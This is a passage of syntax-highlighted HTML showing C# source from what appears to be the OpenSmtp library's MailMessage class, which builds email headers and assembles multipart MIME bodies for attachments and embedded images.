                 </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Reply-To: \""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\" &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Reply-To: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
             </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"From: \""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\" &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"From: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"To: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">CreateAddressList</span><span class="sc10">(</span><span class="sc11">recipientList</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ccList</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"CC: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">CreateAddressList</span><span class="sc10">(</span><span class="sc11">ccList</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">subject</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
             </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">cleanSubject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">(</span><span class="sc11">subject</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">cleanSubject</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"\r\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">cleanSubject</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">);</span><span class="sc0">
                
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Subject: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">cleanSubject</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Date: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">ToUniversalTime</span><span class="sc10">().</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"R"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">X_MAILER_HEADER</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">notification</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                 </span><span class="sc10">{</span><span class="sc0">
                     </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Disposition-Notification-To: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
                 </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                     </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Disposition-Notification-To: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
                 </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">priority</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"X-Priority: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">priority</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">customHeaders</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">

                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IEnumerator</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">customHeaders</span><span class="sc10">.</span><span class="sc11">GetEnumerator</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">.</span><span class="sc11">MoveNext</span><span class="sc10">();)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">MailHeader</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MailHeader</span><span class="sc10">)</span><span class="sc11">i</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">":"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">MailEncoder</span><span class="sc10">.</span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">// TODO: Check if below is within RFC spec.
</span><span class="sc0">                        </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">":\r\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"MIME-Version: 1.0\r\n"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">GetMessageBody</span><span class="sc10">());</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Returns a clone of this message&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.Body = "body";
</span><span class="sc0">        </span><span class="sc15">///     msg.Subject = "subject";
</span><span class="sc0">        </span><span class="sc15">///
</span><span class="sc0">        </span><span class="sc15">///     msg2 = msg.Copy();
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;Mailmessage&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">Copy</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MailMessage</span><span class="sc10">)</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">MemberwiseClone</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// Internal/Private methods below
</span><span class="sc0">        </span><span class="sc2">// ------------------------------------------------------
</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetFileAsString</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0">  </span><span class="sc11">fin</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0">      </span><span class="sc11">bin</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">long</span><span class="sc0">        </span><span class="sc11">rdlen</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">UTF7</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rdlen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">fin</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Determines the format of the message and adds the
</span><span class="sc0">        </span><span class="sc15">/// appropriate mime containers.
</span><span class="sc0">        </span><span class="sc15">/// 
</span><span class="sc0">        </span><span class="sc15">/// This will return the html and/or text and/or 
</span><span class="sc0">        </span><span class="sc15">/// embedded images and/or attachments.
</span><span class="sc0">        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">GetMessageBody</span><span class="sc10">()</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Type: multipart/mixed;"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"boundary=\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\""</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\nThis is a multi-part message in MIME format."</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">GetInnerMessageBody</span><span class="sc10">());</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc11">attachment</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">attachments</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">attachment</span><span class="sc10">.</span><span class="sc11">ToMime</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"--\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Get the html and/or text and/or images.
</span><span class="sc0">        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;&lt;/returns&gt;
</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetInnerMessageBody</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">images</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"Content-Type: multipart/related;"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"boundary=\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">relatedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\""</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">relatedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">GetReadableMessageBody</span><span class="sc10">());</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">images</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc11">image</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">images</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">relatedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">image</span><span class="sc10">.</span><span class="sc11">ToMime</span><span class="sc10">());</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">relatedBoundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"--\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">GetReadableMessageBody</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">htmlBody</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">GetTextMessageBody</span><span class="sc10">(</span><span class="sc11">body</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"text/plain"</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
